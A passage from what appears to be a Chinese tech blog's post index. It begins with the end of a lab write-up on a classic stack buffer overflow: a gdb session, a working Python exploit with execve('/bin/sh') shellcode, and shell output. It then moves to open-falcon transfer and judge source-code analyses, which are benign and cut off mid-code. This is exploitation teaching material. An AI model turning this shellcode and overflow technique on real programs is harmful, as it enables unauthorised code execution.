GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from vul1...done.\ngdb-peda$ dis\ndisable      disassemble  disconnect   display      distance     \ngdb-peda$ disassemble main\nDump of assembler code for function main:\n   0x0804844d <+0>:     push   ebp\n   0x0804844e <+1>:     mov    ebp,esp\n   0x08048450 <+3>:     and    esp,0xfffffff0\n   0x08048453 <+6>:     sub    esp,0x110\n   0x08048459 <+12>:    mov    eax,DWORD PTR [ebp+0xc]\n   0x0804845c <+15>:    add    eax,0x4\n   0x0804845f <+18>:    mov    eax,DWORD PTR [eax]\n   0x08048461 <+20>:    mov    DWORD PTR [esp+0x4],eax\n   0x08048465 <+24>:    lea    eax,[esp+0x10]\n   0x08048469 <+28>:    mov    DWORD PTR [esp],eax\n   0x0804846c <+31>:    call   0x8048320 <strcpy@plt>\n   0x08048471 <+36>:    lea    eax,[esp+0x10]\n   0x08048475 <+40>:    mov    DWORD PTR [esp+0x4],eax\n   0x08048479 <+44>:    mov    DWORD PTR [esp],0x8048520\n   0x08048480 <+51>:    call   0x8048310 <printf@plt>\n   0x08048485 <+56>:    mov    eax,0x0\n   0x0804848a <+61>:    leave  \n   0x0804848b <+62>:    ret    \nEnd of assembler dump.\ngdb-peda$ r `python -c 'print \"A\"*400'`\nStarting program: /home/saar/pwn/vul1 `python -c 'print \"A\"*400'`\nInput:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: 0x0 \nEBX: 0xb7fc0000 --> 0x1acda8 \nECX: 0x0 \nEDX: 0xb7fc1898 --> 0x0 \nESI: 0x0 \nEDI: 0x0 \nEBP: 0x41414141 ('AAAA')\nESP: 0xbffff460 ('A' <repeats 128 times>)\nEIP: 0x41414141 ('AAAA')\nEFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x41414141\n[------------------------------------stack-------------------------------------]\n0000| 0xbffff460 ('A' <repeats 128 times>)\n0004| 0xbffff464 ('A' <repeats 124 times>)\n0008| 0xbffff468 ('A' <repeats 120 times>)\n0012| 0xbffff46c ('A' <repeats 116 times>)\n0016| 0xbffff470 ('A' <repeats 112 times>)\n0020| 0xbffff474 ('A' <repeats 108 times>)\n0024| 0xbffff478 ('A' <repeats 104 times>)\n0028| 0xbffff47c ('A' <repeats 100 times>)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x41414141 in ?? ()\n```\n\nesp 地址是：0xbffff460，\n\n发现ret_address需要保证esp+N<nop的数目\n\n```python\n#exp.py \n#!/usr/bin/env python\nimport struct\nfrom subprocess import call\n\n#Stack address where shellcode is copied.\nret_addr = 0xbffff480      \n              \n#Spawn a shell\n#execve(/bin/sh)\nscode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n\n#endianess convertion\ndef conv(num):\n return struct.pack(\"<I\",num)\n\n# buf = Junk + RA + NOP's + Shellcode\nbuf = \"A\" * 268\nbuf += conv(ret_addr)\nbuf += \"\\x90\" * 40\nbuf += scode\n\nprint \"Calling vulnerable program\"\ncall([\"./vul1\", buf])\n```\n\n最后获取shell:\n\n```shell\nsaar@saar-virtual-machine:~/pwn$ python exp.py \nCalling vulnerable program\nInput:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1/shh/bin\n\n$ \n$ id\nuid=1000(saar) gid=1000(saar) groups=1000(saar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)\n$ \n```\n\n\n\n### 参考\n\nhttps://www.jianshu.com/p/187b810e78d2\n\nhttps://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/","tags":["pwn"],"categories":["pwn"]},{"title":"open-falcon transfer 源码分析","url":"/2020/01/21/transfer源码分析/","content":"## open-falcon transfer 源码分析\n\ntransfer模块是小米监控中比较重要的环境，主要用于发送数据给graph,judge,等。\n\n主要流程在modules/transfer/main.go\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tversionGit := flag.Bool(\"vg\", false, \"show version\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\tif *versionGit {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\t// global config\n    // 解析配置文件\n\tg.ParseConfig(*cfg)\n\t// proc\n    // 就是打印日志。。orz\n\tproc.Start()\n\n    // 发送端启动\n\tsender.Start()\n    // 接收数据启动\n\treceiver.Start()\n\n\t// http\n    //  http服务启动\n\thttp.Start()\n\n\tselect {}\n}\n```\n\n先来看下发送端的代码：\n\n```go\n// 初始化数据发送服务, 在main函数中调用\nfunc Start() {\n\t// 初始化默认参数\n\tMinStep = g.Config().MinStep\n\tif MinStep < 1 {\n\t\tMinStep = 30 //默认30s\n\t}\n\t//初始化连接池\n\tinitConnPools()\n    //初始化发送队列\n\tinitSendQueues()\n\t//初始化hash环，用于做一致性hash分片\n    initNodeRings()\n\t// SendTasks依赖基础组件的初始化,要最后启动\n\tstartSendTasks()\n    //启动发送定时任务\n\tstartSenderCron()\n\tlog.Println(\"send.Start, ok\")\n}\n```\n\n```go\nfunc initConnPools() {\n\tcfg := g.Config()\n\n\t// judge\n    // 读取配置文件，加载进来\n\tjudgeInstances := nset.NewStringSet()\n\tfor _, instance := range cfg.Judge.Cluster {\n\t\tjudgeInstances.Add(instance)\n\t}\n\tJudgeConnPools = backend.CreateSafeRpcConnPools(cfg.Judge.MaxConns, cfg.Judge.MaxIdle,\n\t\tcfg.Judge.ConnTimeout, cfg.Judge.CallTimeout, judgeInstances.ToSlice())\n\n\t// tsdb，是否开启tsdb，初始化\n\tif cfg.Tsdb.Enabled {\n\t\tTsdbConnPoolHelper = backend.NewTsdbConnPoolHelper(cfg.Tsdb.Address, cfg.Tsdb.MaxConns, cfg.Tsdb.MaxIdle, cfg.Tsdb.ConnTimeout, cfg.Tsdb.CallTimeout)\n\t}\n\n\t// graph\n    // graph地址初始化\n\tgraphInstances := nset.NewSafeSet()\n\tfor _, nitem := range cfg.Graph.ClusterList {\n\t\tfor _, addr := range nitem.Addrs {\n\t\t\tgraphInstances.Add(addr)\n\t\t}\n\t}\n\tGraphConnPools = backend.CreateSafeRpcConnPools(cfg.Graph.MaxConns, cfg.Graph.MaxIdle,\n\t\tcfg.Graph.ConnTimeout, cfg.Graph.CallTimeout, graphInstances.ToSlice())\n\n}\n```\n\n初始化发送队列：\n\n```go\n\nfunc initSendQueues() {\n\tcfg := g.Config()\n    // 对每个judge节点构建一个队列\n\tfor node := range cfg.Judge.Cluster {\n\t\tQ := nlist.NewSafeListLimited(DefaultSendQueueMaxSize)\n\t\tJudgeQueues[node] = Q\n\t}\n\t// 对每个graph节点构建一个队列\n\tfor node, nitem := range cfg.Graph.ClusterList {\n\t\tfor _, addr := range nitem.Addrs {\n\t\t\tQ := nlist.NewSafeListLimited(DefaultSendQueueMaxSize)\n\t\t\tGraphQueues[node+addr] = Q\n\t\t}\n\t}\n\t// 对tsdb节点构建队列\n\tif cfg.Tsdb.Enabled {\n\t\tTsdbQueue = nlist.NewSafeListLimited(DefaultSendQueueMaxSize)\n\t}\n}\n```\n\ninitNodeRings构建hash环，用于一致性hash初始化。\n\n```go\nfunc initNodeRings() {\n\tcfg := g.Config()\n\n\tJudgeNodeRing = rings.NewConsistentHashNodesRing(int32(cfg.Judge.Replicas), cutils.KeysOfMap(cfg.Judge.Cluster))\n\tGraphNodeRing = rings.NewConsistentHashNodesRing(int32(cfg.Graph.Replicas), cutils.KeysOfMap(cfg.Graph.Cluster))\n}\n```\n\nstartSendTasks函数启动发送任务：\n\n```go\n// TODO 添加对发送任务的控制,比如stop等\nfunc startSendTasks() {\n\tcfg := g.Config()\n\t// init semaphore\n\tjudgeConcurrent := cfg.Judge.MaxConns\n\tgraphConcurrent := cfg.Graph.MaxConns\n\ttsdbConcurrent := cfg.Tsdb.MaxConns\n\n\tif tsdbConcurrent < 1 {\n\t\ttsdbConcurrent = 1\n\t}\n\n\tif judgeConcurrent < 1 {\n\t\tjudgeConcurrent = 1\n\t}\n\n\tif graphConcurrent < 1 {\n\t\tgraphConcurrent = 1\n\t}\n\n\t// init send go-routines\n\tfor node := range cfg.Judge.Cluster {\n\t\tqueue := JudgeQueues[node]\n\t\tgo forward2JudgeTask(queue, node, judgeConcurrent)\n\t}\n\n\tfor node, nitem := range cfg.Graph.ClusterList {\n\t\tfor _, addr := range nitem.Addrs {\n\t\t\tqueue := GraphQueues[node+addr]\n\t\t\tgo forward2GraphTask(queue, node, addr, graphConcurrent)\n\t\t}\n\t}\n\n\tif cfg.Tsdb.Enabled {\n\t\tgo forward2TsdbTask(tsdbConcurrent)\n\t}\n}\n```\n\nforward2JudgeTask函数用于启动judge发送任务：\n\n```go\n// Judge定时任务, 将 Judge发送缓存中的数据 通过rpc连接池 发送到Judge\nfunc forward2JudgeTask(Q *list.SafeListLimited, node string, concurrent int) {\n\tbatch := g.Config().Judge.Batch // 一次发送,最多batch条数据\n\taddr := g.Config().Judge.Cluster[node]\n\tsema := nsema.NewSemaphore(concurrent)\n\n\tfor {\n\t\titems := Q.PopBackBy(batch)\n\t\tcount := len(items)\n\t\tif count == 0 {\n\t\t\ttime.Sleep(DefaultSendTaskSleepInterval)\n\t\t\tcontinue\n\t\t}\n\n\t\tjudgeItems := make([]*cmodel.JudgeItem, count)\n\t\tfor i := 0; i < count; i++ {\n\t\t\tjudgeItems[i] = items[i].(*cmodel.JudgeItem)\n\t\t}\n\n\t\t//\t同步Call + 有限并发 进行发送\n\t\tsema.Acquire()\n\t\tgo func(addr string, judgeItems []*cmodel.JudgeItem, count int) {\n\t\t\tdefer sema.Release()\n\n\t\t\tresp := &cmodel.SimpleRpcResponse{}\n\t\t\tvar err error\n\t\t\tsendOk := false\n\t\t\tfor i := 0; i < 3; i++ { //最多重试3次\n                // 调用judge rpc send接口发送数据\n\t\t\t\terr = JudgeConnPools.Call(addr, \"Judge.Send\", judgeItems, resp)\n\t\t\t\tif err == nil {\n\t\t\t\t\tsendOk = true\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\ttime.Sleep(time.Millisecond * 10)\n\t\t\t}\n\n\t\t\t// statistics\n\t\t\tif !sendOk {\n\t\t\t\tlog.Printf(\"send judge %s:%s fail: %v\", node, addr, err)\n\t\t\t\tproc.SendToJudgeFailCnt.IncrBy(int64(count))\n\t\t\t} else {\n\t\t\t\tproc.SendToJudgeCnt.IncrBy(int64(count))\n\t\t\t}\n\t\t}(addr, judgeItems, count)\n\t}\n}\n```\n\nforward2GraphTask启动发送存档数据：\n\n```go\n// Graph定时任务, 将 Graph发送缓存中的数据 通过rpc连接池 发送到Graph\nfunc forward2GraphTask(Q *list.SafeListLimited, node string, addr string, concurrent int) {\n\tbatch := g.Config().Graph.Batch // 一次发送,最多batch条数据\n\tsema := nsema.NewSemaphore(concurrent)\n\n\tfor {\n\t\titems := Q.PopBackBy(batch) //从队列中pop指定大小的数据\n\t\tcount := len(items)\n\t\tif count == 0 {\n\t\t\ttime.Sleep(DefaultSendTaskSleepInterval)\n\t\t\tcontinue\n\t\t}\n\n\t\tgraphItems := make([]*cmodel.GraphItem, count)\n\t\tfor i := 0; i < count; i++ {\n\t\t\tgraphItems[i] = items[i].(*cmodel.GraphItem)\n\t\t}\n\n\t\tsema.Acquire()\n\t\tgo func(addr string, graphItems []*cmodel.GraphItem, count int) {\n\t\t\tdefer sema.Release()\n\n\t\t\tresp := &cmodel.SimpleRpcResponse{}\n\t\t\tvar err error\n\t\t\tsendOk := false\n\t\t\tfor i := 0; i < 3; i++ { //最多重试3次\n                // 给graph接口发送数据\n\t\t\t\terr = GraphConnPools.Call(addr, \"Graph.Send\", graphItems, resp)\n\t\t\t\tif err == nil {\n\t\t\t\t\tsendOk = true\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\ttime.Sleep(time.Millisecond * 10)\n\t\t\t}\n\n\t\t\t// statistics\n            //   统计数据，方便后续排查当前队列中发送失败和成功数据量\n\t\t\tif !sendOk {\n\t\t\t\tlog.Printf(\"send to graph %s:%s fail: %v\", node, addr, err)\n\t\t\t\tproc.SendToGraphFailCnt.IncrBy(int64(count))\n\t\t\t} else {\n\t\t\t\tproc.SendToGraphCnt.IncrBy(int64(count))\n\t\t\t}\n\t\t}(addr, graphItems, count)\n\t}\n}\n```\n\n如果有使用tsdb的话，启动tsdb发送task，这边不说了，基本流程类似。\n\n```go\n// Tsdb定时任务, 将数据通过api发送到tsdb\nfunc forward2TsdbTask(concurrent int) {\n\tbatch := g.Config().Tsdb.Batch // 一次发送,最多batch条数据\n\tretry := g.Config().Tsdb.MaxRetry\n\tsema := nsema.NewSemaphore(concurrent)\n\n\tfor {\n\t\titems := TsdbQueue.PopBackBy(batch)\n\t\tif len(items) == 0 {\n\t\t\ttime.Sleep(DefaultSendTaskSleepInterval)\n\t\t\tcontinue\n\t\t}\n\t\t//  同步Call + 有限并发 进行发送\n\t\tsema.Acquire()\n\t\tgo func(itemList []interface{}) {\n\t\t\tdefer sema.Release()\n\n\t\t\tvar tsdbBuffer bytes.Buffer\n\t\t\tcount := len(itemList)\n\t\t\tfor i := 0; i < count; i++ {\n\t\t\t\ttsdbItem := itemList[i].(*cmodel.TsdbItem)\n\t\t\t\ttsdbBuffer.WriteString(tsdbItem.TsdbString())\n\t\t\t\ttsdbBuffer.WriteString(\"\\n\")\n\t\t\t}\n\n\t\t\tvar err error\n\t\t\tfor i := 0; i < retry; i++ {\n\t\t\t\terr = TsdbConnPoolHelper.Send(tsdbBuffer.Bytes())\n\t\t\t\tif err == nil {\n\t\t\t\t\tproc.SendToTsdbCnt.IncrBy(int64(len(itemList)))\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\ttime.Sleep(100 * time.Millisecond)\n\t\t\t}\n\n\t\t\tif err != nil {\n\t\t\t\tproc.SendToTsdbFailCnt.IncrBy(int64(len(itemList)))\n\t\t\t\tlog.Println(err)\n\t\t\t\treturn\n\t\t\t}\n\t\t}(items)\n\t}\n}\n```\n\n接下来函数startSenderCron函数中：\n\n```go\n// send_cron程序入口\nfunc startSenderCron() {\n\tgo startProcCron()  //发送队列统计\n\tgo startLogCron()    //打印日志\n}\n```\n\n发送队列统计数据\n\n```go\nfunc calcSendCacheSize(mapList map[string]*list.SafeListLimited) int64 {\n\tvar cnt int64 = 0\n\tfor _, list := range mapList {\n\t\tif list != nil {\n\t\t\tcnt += int64(list.Len())\n\t\t}\n\t}\n\treturn cnt\n}\n```\n\n接收数据函数\n\n```go\nfunc Start() {\n\tgo rpc.StartRpc()                // rpc接口数据，接收数据\n\tgo socket.StartSocket()          // tcp方式推送数据\n}\n```\n\n 主要看rpc接口，因为socket方式也是小米提供的，底层传输的方法一样。\n\nrpc update接口用于更新数据并打到缓存队列中去，update方法最终调用RecvMetricValues函数：\n\n```go\n// process new metric values\nfunc RecvMetricValues(args []*cmodel.MetricValue, reply *cmodel.TransferResponse, from string) error {\n\tstart := time.Now()\n\treply.Invalid = 0\n\n\titems := []*cmodel.MetaData{}\n\tfor _, v := range args {\n\t\tif v == nil {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\t// 历史遗留问题.\n\t\t// 老版本agent上报的metric=kernel.hostname的数据,其取值为string类型,现在已经不支持了;所以,这里硬编码过滤掉\n        \n        // 很多的过滤策略。\n\t\tif v.Metric == \"kernel.hostname\" {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif v.Metric == \"\" || v.Endpoint == \"\" {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif v.Type != g.COUNTER && v.Type != g.GAUGE && v.Type != g.DERIVE {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif v.Value == \"\" {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif v.Step <= 0 {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif len(v.Metric)+len(v.Tags) > 510 {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\t// TODO 呵呵,这里需要再优雅一点\n\t\tnow := start.Unix()\n\t\tif v.Timestamp <= 0 || v.Timestamp > now*2 {\n\t\t\tv.Timestamp = now\n\t\t}\n\n\t\tfv := &cmodel.MetaData{\n\t\t\tMetric:      v.Metric,\n\t\t\tEndpoint:    v.Endpoint,\n\t\t\tTimestamp:   v.Timestamp,\n\t\t\tStep:        v.Step,\n\t\t\tCounterType: v.Type,\n\t\t\tTags:        cutils.DictedTagstring(v.Tags), //TODO tags键值对的个数,要做一下限制\n\t\t}\n\n\t\tvalid := true\n\t\tvar vv float64\n\t\tvar err error\n\n\t\tswitch cv := v.Value.(type) {\n\t\tcase string:\n\t\t\tvv, err = strconv.ParseFloat(cv, 64)\n\t\t\tif err != nil {\n\t\t\t\tvalid = false\n\t\t\t}\n\t\tcase float64:\n\t\t\tvv = cv\n\t\tcase int64:\n\t\t\tvv = float64(cv)\n\t\tdefault:\n\t\t\tvalid = false\n\t\t}\n\n\t\tif !valid {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tfv.Value = vv\n\t\titems = append(items, fv)\n\t}\n\n\t// statistics\n\tcnt := int64(len(items))\n\tproc.RecvCnt.IncrBy(cnt)\n    // 统计\n\tif from == \"rpc\" {\n\t\tproc.RpcRecvCnt.IncrBy(cnt)\n\t} else if from == \"http\" {\n\t\tproc.HttpRecvCnt.IncrBy(cnt)\n\t}\n\n\tcfg := g.Config()\n\n    //   打到对应的缓存队列中去。\n\tif cfg.Graph.Enabled {\n\t\tsender.Push2GraphSendQueue(items)\n\t}\n\n\tif cfg.Judge.Enabled {\n\t\tsender.Push2JudgeSendQueue(items)\n\t}\n\n\tif cfg.Tsdb.Enabled {\n\t\tsender.Push2TsdbSendQueue(items)\n\t}\n\n\treply.Message = \"ok\"\n\treply.Total = len(args)\n\treply.Latency = (time.Now().UnixNano() - start.UnixNano()) / 1000000\n\n\treturn nil\n}\n```\n\n函数push2GraphSendQueue函数：\n\n```go\n// 将数据 打入 某个Graph的发送缓存队列, 具体是哪一个Graph 由一致性哈希 决定\nfunc Push2GraphSendQueue(items []*cmodel.MetaData) {\n\tcfg := g.Config().Graph\n\n\tfor _, item := range items {\n        // 转换数据\n\t\tgraphItem, err := convert2GraphItem(item)\n\t\tif err != nil {\n\t\t\tlog.Println(\"E:\", err)\n\t\t\tcontinue\n\t\t}\n\t\tpk := item.PK()\n\n\t\t// statistics. 为了效率,放到了这里,因此只有graph是enbale时才能trace\n\t\tproc.RecvDataTrace.Trace(pk, item)\n\t\tproc.RecvDataFilter.Filter(pk, item.Value, item)\n\t\t// 得到对应的一致性hash分片节点\n\t\tnode, err := GraphNodeRing.GetNode(pk)\n\t\tif err != nil {\n\t\t\tlog.Println(\"E:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tcnode := cfg.ClusterList[node]\n\t\terrCnt := 0\n\t\tfor _, addr := range cnode.Addrs {\n\t\t\tQ := GraphQueues[node+addr]\n             // 获取队列并推送到缓存队列中去\n\t\t\tif !Q.PushFront(graphItem) {\n\t\t\t\terrCnt += 1\n\t\t\t}\n\t\t}\n\n\t\t// statistics\n\t\tif errCnt > 0 {\n\t\t\tproc.SendToGraphDropCnt.Incr()\n\t\t}\n\t}\n}\n```\n\n其他两个函数基本类似，都是使用这种方式来将数据推送的内存队列中，然后使用send task 任务发送出去。队列不会堆积，因为发送的时候会出队，不过这样如果发送三次还是失败，这个数据就丢失了。。只能通过统计数据来定位了。\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon judge 源码分析","url":"/2020/01/21/judge源码分析/","content":"## open-falcon judge源码分析\n\njudge模块主要流程在modules/judge/main\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\t//解析配置文件\n\tg.ParseConfig(*cfg)\n\t// 初始化数据库连接池\n\tg.InitRedisConnPool()\n    // 初始化HBS客户端\n\tg.InitHbsClient()\n\t//初始化存储，初始化内存BigMap，存储采集历史数据\n\tstore.InitHistoryBigMap()\n\t//http服务启动\n\tgo http.Start()\n    // rpc服务启动\n\tgo rpc.Start()\n\t//定时从HBS同步策略\n\tgo cron.SyncStrategies()\n    //清理无效数据\n\tgo cron.CleanStale()\n\n\tselect {}\n}\n```\n\nhttp服务接口数据，注册route:\n\n```go\nfunc init() {\n\tconfigCommonRoutes()\n\tconfigInfoRoutes()\n}\n```\n\n再看下rpc接口，judge主要有Send函数来做：\n\n```go\nfunc (this *Judge) Send(items []*model.JudgeItem, resp *model.SimpleRpcResponse) error {\n\tremain := g.Config().Remain\n\t// 把当前时间的计算放在最外层，是为了减少获取时间时的系统调用开销\n\tnow := time.Now().Unix()\n\tfor _, item := range items {\n\t\texists := g.FilterMap.Exists(item.Metric)\n\t\tif !exists {\n\t\t\tcontinue\n\t\t}\n\t\tpk := item.PrimaryKey()\n        // 接收数据，将数据放到bigMap中去\n\t\tstore.HistoryBigMap[pk[0:2]].PushFrontAndMaintain(pk, item, remain, now)\n\t}\n\treturn nil\n}\n```\n\n函数推送\n\n```go\n\nfunc (this *JudgeItemMap) PushFrontAndMaintain(key string, val *model.JudgeItem, maxCount int, now int64) {\n    // 如果这个keys存在了则压入队列，如果不存在放入队列之后调用judge函数判断\n\tif linkedList, exists := this.Get(key); exists {\n\t\tneedJudge := linkedList.PushFrontAndMaintain(val, maxCount)\n\t\tif needJudge {\n\t\t\tJudge(linkedList, val, now)\n\t\t}\n\t} else {\n\t\tNL := list.New()\n\t\tNL.PushFront(val)\n\t\tsafeList := &SafeLinkedList{L: NL}\n\t\tthis.Set(key, safeList)\n\t\tJudge(safeList, val, now)\n\t}\n}\n```\n\n检查Strategy和expression:\n\n```go\nfunc Judge(L *SafeLinkedList, firstItem *model.JudgeItem, now int64) {\n\tCheckStrategy(L, firstItem, now)\n\tCheckExpression(L, firstItem, now)\n}\n```\n\n```go\nfunc CheckStrategy(L *SafeLinkedList, firstItem *model.JudgeItem, now int64) {\n\tkey := fmt.Sprintf(\"%s/%s\", firstItem.Endpoint, firstItem.Metric)\n\tstrategyMap := g.StrategyMap.Get()\n\tstrategies, exists := strategyMap[key]\n\tif !exists {\n\t\treturn\n\t}\n\n\tfor _, s := range strategies {\n\t\t// 因为key仅仅是endpoint和metric，所以得到的strategies并不一定是与当前judgeItem相关的\n\t\t// 比如lg-dinp-docker01.bj配置了两个proc.num的策略，一个name=docker，一个name=agent\n\t\t// 所以此处要排除掉一部分\n\t\trelated := true\n\t\tfor tagKey, tagVal := range s.Tags {\n\t\t\tif myVal, exists := firstItem.Tags[tagKey]; !exists || myVal != tagVal {\n\t\t\t\trelated = false\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\t// 查找到相关的指标，然后judge对应的策略\n\t\tif !related {\n\t\t\tcontinue\n\t\t}\n\n\t\tjudgeItemWithStrategy(L, s, firstItem, now)\n\t}\n}\n```\n\njudgeItemWithStrategy函数寻找相应的策略：\n\n```go\nfunc judgeItemWithStrategy(L *SafeLinkedList, strategy model.Strategy, firstItem *model.JudgeItem, now int64) {\n\tfn, err := ParseFuncFromString(strategy.Func, strategy.Operator, strategy.RightValue)\n\tif err != nil {\n\t\tlog.Printf(\"[ERROR] parse func %s fail: %v. strategy id: %d\", strategy.Func, err, strategy.Id)\n\t\treturn\n\t}\n\t//判断是否需要触发，如果满足条件，则发送事件\n\thistoryData, leftValue, isTriggered, isEnough := fn.Compute(L)\n\tif !isEnough {\n\t\treturn\n\t}\n\n\tevent := &model.Event{\n\t\tId:         fmt.Sprintf(\"s_%d_%s\", strategy.Id, firstItem.PrimaryKey()),\n\t\tStrategy:   &strategy,\n\t\tEndpoint:   firstItem.Endpoint,\n\t\tLeftValue:  leftValue,\n\t\tEventTime:  firstItem.Timestamp,\n\t\tPushedTags: firstItem.Tags,\n\t}\n\t// 发送事件\n\tsendEventIfNeed(historyData, isTriggered, now, event, strategy.MaxStep)\n}\n```\n\n```go\nfunc sendEventIfNeed(historyData []*model.HistoryData, isTriggered bool, now int64, event *model.Event, maxStep int) {\n\tlastEvent, exists := g.LastEvents.Get(event.Id)\n\tif isTriggered {\n\t\tevent.Status = \"PROBLEM\"\n\t\tif !exists || lastEvent.Status[0] == 'O' {\n\t\t\t// 本次触发了阈值，之前又没报过警，得产生一个报警Event\n\t\t\tevent.CurrentStep = 1\n\n\t\t\t// 但是有些用户把最大报警次数配置成了0，相当于屏蔽了，要检查一下\n\t\t\tif maxStep == 0 {\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tsendEvent(event)\n\t\t\treturn\n\t\t}\n\n\t\t// 逻辑走到这里，说明之前Event是PROBLEM状态\n\t\tif lastEvent.CurrentStep >= maxStep {\n\t\t\t// 报警次数已经足够多，到达了最多报警次数了，不再报警\n\t\t\treturn\n\t\t}\n\n\t\tif historyData[len(historyData)-1].Timestamp <= lastEvent.EventTime {\n\t\t\t// 产生过报警的点，就不能再使用来判断了，否则容易出现一分钟报一次的情况\n\t\t\t// 只需要拿最后一个historyData来做判断即可，因为它的时间最老\n\t\t\treturn\n\t\t}\n\n\t\tif now-lastEvent.EventTime < g.Config().Alarm.MinInterval {\n\t\t\t// 报警不能太频繁，两次报警之间至少要间隔MinInterval秒，否则就不能报警\n\t\t\treturn\n\t\t}\n\n\t\tevent.CurrentStep = lastEvent.CurrentStep + 1\n\t\tsendEvent(event) //发送事件，函数将报警事件存储到redis队列中去。\n\t} else {\n\t\t// 如果LastEvent是Problem，报OK，否则啥都不做\n\t\tif exists && lastEvent.Status[0] == 'P' {\n\t\t\tevent.Status = \"OK\"\n\t\t\tevent.CurrentStep = 1\n\t\t\tsendEvent(event)\n\t\t}\n\t}\n}\n```\n\n检查表达式是否满足要求：\n\n```go\nfunc CheckExpression(L *SafeLinkedList, firstItem *model.JudgeItem, now int64) {\n\tkeys := buildKeysFromMetricAndTags(firstItem)\n\tif len(keys) == 0 {\n\t\treturn\n\t}\n\n\t// expression可能会被多次重复处理，用此数据结构保证只被处理一次\n\thandledExpression := make(map[int]struct{})\n\n\texpressionMap := g.ExpressionMap.Get()\n\tfor _, key := range keys {\n\t\texpressions, exists := expressionMap[key]\n\t\tif !exists {\n\t\t\tcontinue\n\t\t}\n\t\t//过滤相关表达式\n\t\trelated := filterRelatedExpressions(expressions, firstItem)\n\t\tfor _, exp := range related {\n\t\t\tif _, ok := handledExpression[exp.Id]; ok {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\thandledExpression[exp.Id] = struct{}{}\n\t\t\tjudgeItemWithExpression(L, exp, firstItem, now)\n\t\t}\n\t}\n}\n```\n\n类似的满足要求发送事件给redis：\n\n```go\nfunc judgeItemWithExpression(L *SafeLinkedList, expression *model.Expression, firstItem *model.JudgeItem, now int64) {\n\tfn, err := ParseFuncFromString(expression.Func, expression.Operator, expression.RightValue)\n\tif err != nil {\n\t\tlog.Printf(\"[ERROR] parse func %s fail: %v. expression id: %d\", expression.Func, err, expression.Id)\n\t\treturn\n\t}\n\n\thistoryData, leftValue, isTriggered, isEnough := fn.Compute(L)\n\tif !isEnough {\n\t\treturn\n\t}\n\n\tevent := &model.Event{\n\t\tId:         fmt.Sprintf(\"e_%d_%s\", expression.Id, firstItem.PrimaryKey()),\n\t\tExpression: 